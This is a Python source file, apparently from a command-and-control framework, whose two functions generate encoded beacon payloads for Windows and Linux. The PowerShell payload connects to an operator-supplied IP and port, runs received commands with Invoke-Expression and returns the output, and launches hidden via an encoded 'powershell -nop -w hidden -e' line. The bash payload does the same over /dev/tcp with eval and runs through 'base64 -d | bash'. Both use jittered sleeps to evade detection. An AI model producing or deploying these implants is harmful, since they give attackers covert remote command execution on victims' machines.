import base64

def win(ip, port, delay, jitter):
    parameters = f"""
    $ServerIP = "{ip}"
    $ServerPort = {port}
    $Delay = {delay}
    $Jitter = {jitter}
    """
    code = """
    # Function to generate random sleep interval
    function Get-RandomSleepTime {
        param (
            [int]$BaseDelay,
            [int]$Jitter
        )
        $lower = $BaseDelay - $Jitter
        $upper = $BaseDelay + $Jitter
        return Get-Random -Minimum $lower -Maximum ($upper + 1)
    }

    # Infinite loop to beacon to the agent server
    while ($true) {
        try {
            # Establish TCP connection
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $tcpClient.Connect($ServerIP, $ServerPort)
            $stream = $tcpClient.GetStream()
            $reader = New-Object System.IO.StreamReader($stream)
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.AutoFlush = $true

            Write-Host "[$(Get-Date)] Checking in..."

            # Inner loop to read and execute commands from the server
            while ($tcpClient.Connected -and $stream.DataAvailable) {
                # Read command from the server if available
                $command = $reader.ReadLine()
                if ($command) {
                    Write-Host "Received command: $command"
                    
                    # Execute the command and capture output
                    try {
                        $output = Invoke-Expression $command 2>&1 | Out-String
                    } catch {
                        $output = "Error executing command: $_"
                    }
                    
                    # Ensure output is in string format, handling arrays properly
                    $formattedOutput = ($output -join "`n").Trim()
                    
                    # Send output back to server
                    $writer.WriteLine($formattedOutput)
                    $writer.WriteLine("ac2delim")
                }
            }

            # Close connection after processing commands
            $reader.Close()
            $writer.Close()
            $tcpClient.Close()
            $stream = $null
        }
        catch {
            Write-Host "Failed to connect or connection lost. Retrying after delay..."
        }

        # Calculate randomized sleep time and wait before next connection attempt
        $sleepTime = Get-RandomSleepTime -BaseDelay $Delay -Jitter $Jitter
        Start-Sleep -Seconds $sleepTime
    }
    """
    payload = parameters + code
    b64 = base64.b64encode(payload.encode("utf-16")[2:]).decode("utf-8")
    enc_payload = "powershell -nop -w hidden -e " + b64

    return enc_payload

def lin(ip, port, delay, jitter):
    parameters = f"""
    #!/bin/bash
    SERVER_IP="{ip}"
    SERVER_PORT={port}
    DELAY={delay}
    JITTER={jitter}
    """
    code = """
    # Beacon to communicate with Agent Server
    while true; do
            # Open socket
            echo "[$(date)] Checking in..."
            exec 5<>/dev/tcp/$SERVER_IP/$SERVER_PORT
            while IFS= read -r -t 1 command <&5; do
                    echo "Received command: $command"
                    output=$(eval "$command" 2>&1 &)
                    wait
                    echo "$output" >&5
                    echo "ac2delim" >&5
            done

            # Close socket
            exec 5>&-; exec 5<&-

            # Sleep for DELAY +- JITTER
            lower=$(( $DELAY - $JITTER ))
            upper=$(( $DELAY + $JITTER ))
            sleep_time=$(( RANDOM % ($upper - $lower + 1) + $lower ))
            sleep $sleep_time
    done
    """
    payload = parameters + code
    b64 = base64.b64encode(payload.encode("utf-8")).decode("utf-8")
    enc_payload = "echo " + b64 + " | base64 -d | bash"

    return enc_payload